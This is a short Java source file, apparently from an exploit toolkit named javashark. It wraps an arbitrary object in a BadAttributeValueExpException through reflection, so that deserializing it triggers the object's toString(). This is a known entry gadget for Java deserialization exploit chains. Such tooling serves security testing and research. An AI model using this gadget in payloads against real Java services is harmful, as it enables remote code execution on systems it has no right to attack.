package dev.silente.javashark.gadget.jdk;

import dev.silente.javashark.utils.ReflectUtils;

import javax.management.BadAttributeValueExpException;

public class GBadAttributeValueExpException {
    public static BadAttributeValueExpException deserialize2ToString(Object poc) throws Exception {
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        ReflectUtils.setFieldValue(badAttributeValueExpException,"val",poc);
        return badAttributeValueExpException;
    }
}
